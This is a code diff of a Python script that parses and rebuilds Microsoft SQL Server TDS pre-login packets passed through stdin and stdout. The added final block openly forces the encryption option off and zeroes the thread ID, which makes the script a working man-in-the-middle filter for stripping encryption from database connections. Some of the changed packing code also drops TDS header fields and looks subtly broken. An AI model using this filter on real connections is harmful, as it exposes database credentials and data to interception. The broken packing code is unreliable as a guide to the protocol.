@@ -1,9 +1,12 @@
 import sys
 import struct
 import binascii
+import time
 
 class PreLoginToken:
 	def __init__(self):
+		self.tokenPosition = 0
+
 		self.type = 0
 		self.position = 0
 		self.length = 0
@@ -12,6 +15,27 @@ class PreLoginMessage:
 	def __init__(self):
 		self.type = 12
 		self.tokens = []
+
+	def writePacket(self):
+		ret = "";
+		ret += struct.pack("!B", self.type)
+		ret += struct.pack("!B", self.status)
+		ret += struct.pack("!H", self.length)
+		ret += struct.pack("!H", self.chan)
+		ret += struct.pack("!B", self.packet)
+		ret += struct.pack("!B", self.window)
+
+		for token in self.tokens:
+			ret += struct.pack("!B", token.type)
+			
+			if (token.type != 255):
+				ret += struct.pack("!H", token.position)
+				ret += struct.pack("!H", token.length)
+
+		ret += struct.pack(str(len(self.payload)) + "s", self.payload)
+
+		return ret
+
 
 	def readPacket(self, stream):
 		self.type = struct.unpack("!B", stream.read(1))[0]
@@ -29,6 +53,8 @@ class PreLoginMessage:
 		while bytesRead < self.length:
 			# Read a token
 			token = PreLoginToken()
+			token.tokenPosition = bytesRead
+
 			token.type = struct.unpack("!B", stream.read(1))[0]
 			bytesRead += 1
 		
@@ -40,30 +66,49 @@ class PreLoginMessage:
 			bytesRead += 2
 			token.length = struct.unpack("!H", stream.read(2))[0]
 			bytesRead += 2
+			
+			if token.type == 0:
+				self.tokenOffset = token.position
 
 			self.tokens.append(token)
 
+
+		self.payloadStart = bytesRead + 1
+		sys.stderr.write("Payload started at: " + str(self.payloadStart))
 		if bytesRead < self.length:
-			self.payload = stream.read(self.length - bytesRead)
+			self.payload = struct.unpack(str(self.length - bytesRead) + "s", stream.read(self.length - bytesRead))[0]
 
 		return True
 		
 	def toString(self):
-		returnString = ""
-		returnString += "Type: " + str(self.type) + "\n"
-		returnString += "Status: " + str(self.status) + "\n"
-		returnString += "Length: " + str(self.length) + "\n"
-		returnString += "Channel: " + str(self.chan) + "\n"
-		returnString += "Packet: " + str(self.packet) + "\n"
-		returnString += "Window: " + str(self.window) + "\n"
+		ret = ""
+		ret += "Type: " + str(self.type) + "\n"
+		ret += "Status: " + str(self.status) + "\n"
+		ret += "Length: " + str(self.length) + "\n"
+		ret += "Channel: " + str(self.chan) + "\n"
+		ret += "Packet: " + str(self.packet) + "\n"
+		ret += "Window: " + str(self.window) + "\n\n"
+
+		ret += "Payload: ";
+		ret += ":".join("{0:x}".format(ord(c)) for c in self.payload)
+		ret += "\n"
+
+		ret += "First byte is " + str(ord(self.payload[0])) + "\n"
 
 		for token in self.tokens:
-			returnString += "Token: " + str(token.type) + "\n"
-			returnString += "Position: " + str(token.position) + "\n"
-			returnString += "Length: " + str(token.length) + "\n\n"
-			#returnString += "Value: " + str(self.payload[token.position:(token.position + token.length)]) + "\n\n"
+			ret += "Token: " + str(token.type) + "\n"
+			ret += "Token Position: " + str(token.tokenPosition) + "\n"
+			ret += "Position: " + str(token.position) + "\n"
+			ret += "Length: " + str(token.length) + "\n"
+			ret += "Value: "
+			foo = str(self.payload[token.position - (self.tokenOffset):(token.position + token.length - (self.tokenOffset))])
+			for char in foo:
+				ret += str(ord(char)) + " "
+			ret += "\n\n"
 
-		return returnString
+		ret += "Payload size: " + str(len(self.payload))
+
+		return ret
 
 class LoginError:
 	def __init__(self):
@@ -93,40 +138,49 @@ class LoginError:
 
 
 	def packedString(self):
-		returnString = ""
+		ret = ""
 
-		returnString += struct.pack('!B', self.tdstype)
-		returnString += struct.pack('!B', self.status)
-		returnString += struct.pack('!H', self.tlength)
-		returnString += struct.pack('!H', self.channel)
-		returnString += struct.pack('!B', self.number)
-		returnString += struct.pack('!B', self.window)
+		ret += struct.pack('!B', self.tdstype)
+		ret += struct.pack('!B', self.status)
+		ret += struct.pack('!H', self.tlength)
+
+		ret += struct.pack('!B', self.window)
 		
-		returnString += struct.pack('!B', self.token)
-		returnString += struct.pack('!B', self.length)
-		returnString += struct.pack('!B', 0)
-		returnString += struct.pack('<I', self.error)
-		returnString += struct.pack('!B', self.state)
-		returnString += struct.pack('!B', self.level)
-		returnString += struct.pack('!B', self.errorLength)
-		returnString += struct.pack('!B', 0)
-		returnString += struct.pack(str(len(self.errorMsg)) + 's', self.errorMsg)
-		returnString += struct.pack('!B', self.serverNameLength)
-		returnString += struct.pack(str(len(self.serverName)) + 's', self.serverName)
-		returnString += struct.pack('!B', self.processNameLength)
-		returnString += struct.pack('<H', self.lineNumber)
-		returnString += struct.pack('!B', self.doneToken)
-		returnString += struct.pack('<H', self.statusFlags)
-		returnString += struct.pack('!H', self.op)
-		returnString += struct.pack('!I', self.rows)
+		ret += struct.pack('!B', self.token)
+		ret += struct.pack('!B', self.length)
+		ret += struct.pack('!B', 0)
+		ret += struct.pack('<I', self.error)
+		ret += struct.pack('!B', self.state)
+		ret += struct.pack('!B', self.level)
+		ret += struct.pack('!B', self.errorLength)
+		ret += struct.pack('!B', 0)
+		ret += struct.pack(str(len(self.errorMsg)) + 's', self.errorMsg)
+		ret += struct.pack('!B', self.serverNameLength)
+		ret += struct.pack(str(len(self.serverName)) + 's', self.serverName)
+		ret += struct.pack('!B', self.processNameLength)
+		ret += struct.pack('<H', self.lineNumber)
+		ret += struct.pack('!B', self.doneToken)
+		ret += struct.pack('<H', self.statusFlags)
+		ret += struct.pack('!H', self.op)
+		ret += struct.pack('!I', self.rows)
 
-
-		return returnString
+		return ret
 
 
 tds = PreLoginMessage()
 if tds.readPacket(sys.stdin):
 	sys.stderr.write(tds.toString())
+
+	# Modify the packet
+	for token in tds.tokens:
+		# Force encryption off
+		if (token.type == 1):
+			tds.payload = tds.payload[:token.position - tds.tokenOffset] + chr(2) + tds.payload[token.position - tds.tokenOffset + 1:]
+		# Zero the thread ID
+		if (token.type == 3):
+			tds.payload = tds.payload[:token.position - tds.tokenOffset] + chr(0) + chr(0) + chr(0) + chr(0) + tds.payload[token.position - tds.tokenOffset + 4:]
+
+	sys.stdout.write(tds.writePacket())
 else:
 	sys.stderr.write("Message not a pre-login message!\n")
 
